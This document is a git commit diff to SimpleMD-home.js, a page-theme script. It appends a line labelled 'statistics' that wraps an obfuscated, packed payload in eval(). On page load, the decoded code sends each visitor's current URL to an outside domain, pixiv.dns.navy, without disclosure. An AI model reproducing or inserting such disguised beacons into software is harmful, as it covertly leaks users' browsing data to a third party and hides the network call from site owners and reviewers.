8ef75406fe9b0bf3e24fec31b57d1423888779aa
希露菲尔 <53271601+hearuphill@users.noreply.github.com>
2020-02-27 22:11:29 +0800

    Update SimpleMD-home.js

--- SimpleMD-home.js
+++ SimpleMD-home.js
@@ -16,3 +16,5 @@ $("body").addClass("mdui-theme-primary-indigo mdui-theme-accent-pink");
 $(".wo-search-form").after("<br>");
 $(".wo-search-form").after($('#wo-footer'));
 });
+//统计
+eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-4]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.onload=function(){var 0;if(1.2){0=3 2()}else{0=3 ActiveXObject("Microsoft.XMLHTTP")}0.open("GET","http://pixiv.dns.navy/statistics/?4="+location.4,true);0.send()}',[],5,'xmlhttp|window|XMLHttpRequest|new|href'.split('|'),0,{}))
